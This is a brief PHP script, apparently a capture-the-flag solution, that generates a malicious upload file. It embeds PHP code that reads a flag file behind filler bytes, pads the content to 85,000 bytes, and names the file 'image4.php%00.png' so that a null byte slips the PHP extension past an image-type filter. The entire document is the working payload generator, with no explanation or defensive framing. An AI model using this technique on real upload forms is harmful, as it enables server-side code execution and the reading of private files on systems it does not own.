<?php
// File content
$content = "12345678<?php readfile('FLAG_4.txt') ?>";

// Target size
$targetSize = 85000;

// Calculate the current content size
$currentSize = strlen($content);

// If the current size is less than the target size
if ($currentSize < $targetSize) {
    // Add padding bytes until the target size is reached
    $fillSize = $targetSize - $currentSize;
    $fillContent = str_repeat(' ', $fillSize); // Padding with spaces

    // Write the padded content into the file
    file_put_contents('image4.php%00.png', $content . $fillContent);
} else {
    // If the current size is already greater than or equal to the target size, do nothing
}
?>
